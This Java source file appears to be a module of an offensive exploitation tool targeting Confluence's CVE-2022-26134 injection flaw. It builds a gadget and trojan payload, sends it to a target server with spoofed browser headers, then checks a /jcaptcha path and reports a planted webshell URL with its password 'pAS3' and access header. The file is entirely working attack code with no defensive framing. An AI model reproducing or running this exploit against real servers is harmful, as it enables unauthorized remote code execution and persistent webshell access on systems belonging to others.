package exp.confluence;

import core.GeneratePayload;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import utils.Util;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

public class Confluence_CVE_2022_26134 extends BaseExp implements AttackBase {
    private static Map<String, String> VersionToJdk = new HashMap<String,String>();



    public void attack(String stripUrl, String gadgetType, String payloadType, String trojanType)  {
        boolean success = false;
        String payload = null;
        try {

            payload = (String)GeneratePayload.generatePayload(gadgetType, payloadType, trojanType);
            String[] payloads = payload.split("postData");
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("Cache-Control", "max-age=0");
            header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36");
            header.put("Accept-Encoding", "gzip, deflate");
            header.put("Accept-Language", "zh-CN,zh;q=0.9");
            String mime = "application/x-www-form-urlencoded; charset=utf-8";
            String postData = "search=" +URLEncoder.encode(payloads[1], "utf-8");
            this.launch(stripUrl +"/" + payloads[0] , postData, mime, header);
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response  = this.launch(stripUrl + "/jcaptcha", header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("Success")) {
                Util.messageQueue.add(String.format("Shell_Url： %s\n", stripUrl + "/jcaptcha"));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
    }

    @Override
    public void run(HashMap<String, String> params) {
        String target = params.get("target");
        String payloadType = params.get("payloadType");
        String gadgetType = params.get("gadgetType");
        String trojanType = params.get("trojanType");


        this.attack(target, gadgetType, payloadType, trojanType);

    }
}
